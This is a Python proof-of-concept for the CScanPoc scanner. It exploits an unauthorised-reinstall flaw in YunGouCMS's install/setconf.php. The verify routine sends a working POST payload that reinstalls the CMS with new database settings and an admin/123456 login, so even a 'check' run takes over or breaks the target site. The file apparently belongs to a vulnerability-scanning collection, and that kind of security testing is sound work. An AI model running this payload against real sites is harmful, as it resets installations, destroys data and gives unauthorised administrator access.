# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'YunGouCMS_0001'  # 平台漏洞编号，留空
    name = '云购CMS 未授权重装漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-03-06'  # 漏洞公布时间
    desc = '''
        云购CMS是国内领先的PHP云购夺宝源码,企业版授权之后终身使用、无限升级。
        YunGouCMS(云购CMS) 在install目录下 有个setconf.php
        虽然index check.php 等文件都验证 唯独重要的setconf.php没有，造成未授权重装漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2986/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'YunGouCMS(云购CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '160b5b5e-36e8-43cd-91fb-b58b5367d3cb'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/yungou/install/setconf.php'
            data = "edit=&db_host=localhost&db_user=root&db_pwd=&db_name=yungou&db_prefix=go_&user_name=admin&password=123456&repassword=123456"
            url = self.target + payload
            r = requests.post(url, data=data)

            if 'SQL执行成功' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
